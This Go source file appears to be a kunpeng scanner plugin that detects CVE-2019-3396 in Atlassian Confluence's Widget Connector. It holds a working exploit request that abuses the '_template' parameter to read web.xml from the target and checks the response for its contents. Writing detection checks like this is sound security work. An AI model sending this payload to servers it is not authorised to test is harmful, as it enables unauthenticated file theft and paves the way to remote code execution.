package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type confluenceWidgetRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("confluence", &confluenceWidgetRCE{})
}
func (d *confluenceWidgetRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Atlassian Confluence Widget Connector macro 远程代码执行",
		Remarks: "Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者无需登录即可利用此漏洞读取服务器任意文件与远程代码执行。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://paper.seebug.org/884/",
			CVE:  "CVE-2019-3396",
			KPID: "KP-0083",
		},
	}
	return d.info
}
func (d *confluenceWidgetRCE) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *confluenceWidgetRCE) Check(URL string, meta plugin.TaskMeta) bool {
	poc := `{"contentId":"123","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/123","width":"10","height":"10","_template":"../web.xml"}}}	`
	request, err := http.NewRequest("POST", URL+"/rest/tinymce/1/macro/preview", strings.NewReader(poc))
	if err != nil {
		return false
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("Referer", URL+"/pages/resumedraft.action?draftId=123&draftShareId=123&")
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "<param-name>contextConfigLocation</param-name>") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
